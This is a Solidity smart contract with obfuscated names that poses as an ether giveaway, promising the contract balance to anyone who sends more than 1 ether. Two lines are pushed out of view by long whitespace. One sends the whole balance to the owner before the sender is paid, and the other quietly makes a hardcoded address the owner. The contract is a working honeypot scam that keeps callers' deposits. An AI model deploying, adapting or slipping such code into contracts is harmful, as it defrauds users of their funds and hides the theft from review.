pragma solidity ^0.4.19;

contract OX7B4DF339
{
    address public OX6800F948 = msg.sender;
   
    function() public payable{}
   
    function OX1F2A9C7A()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               OX6800F948.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function OX5A9B2DA8()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){OX6800F948=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == OX6800F948);
        OX6800F948.transfer(this.balance);
    }
    
    function OX3A1D9F0C(address OX2E7B3F9D,bytes OX6C8E4A5B)
    payable
    public
    {
        require(msg.sender == OX6800F948);
         
        OX2E7B3F9D.call.value(msg.value)(OX6C8E4A5B);
    }
}